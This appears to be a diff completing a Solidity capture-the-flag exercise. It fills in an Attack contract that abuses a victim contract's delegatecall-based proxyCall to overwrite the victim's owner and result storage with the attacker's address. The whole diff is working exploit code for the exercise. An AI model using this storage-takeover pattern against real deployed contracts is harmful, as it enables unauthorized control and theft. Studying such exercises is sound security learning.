@@ -19,22 +19,21 @@ contract Attack {
     address public owner;
     mapping(address => bool) public result;
     address internal immutable victim;
-    address me = address(this);
+    address me;
     constructor(address addr) payable {
         victim = addr;
-        me = address(this);
     }
 
     function changeResult() external {
-        owner = address(this);
-        result[address(this)] = true;
+        owner = me;
+        result[me] = true;
     }
 
     function exploit() external {
         // TODO: Add your implementation here
         // Note: Make sure you know how delegatecall works
         // bytes memory data = ...
-   
+        me = address(this);
         bytes memory data = abi.encodeWithSignature("changeResult()");
         ID31eg4t3(victim).proxyCall(data);
         // (abi.encodeWithSelector(ID31eg4t3.proxyCall.selector, data));
